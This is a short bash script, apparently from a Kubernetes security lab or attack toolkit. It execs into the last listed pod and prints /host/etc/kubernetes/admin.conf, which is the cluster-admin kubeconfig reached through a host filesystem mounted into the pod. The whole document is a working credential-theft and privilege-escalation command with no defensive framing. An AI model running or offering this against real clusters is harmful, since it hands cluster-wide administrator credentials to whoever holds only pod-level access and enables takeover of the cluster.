#!/bin/bash
kubectl get pods | awk '{print $1}' | tail -1  | xargs -I{} kubectl exec --stdin --tty {} -- cat /host/etc/kubernetes/admin.conf
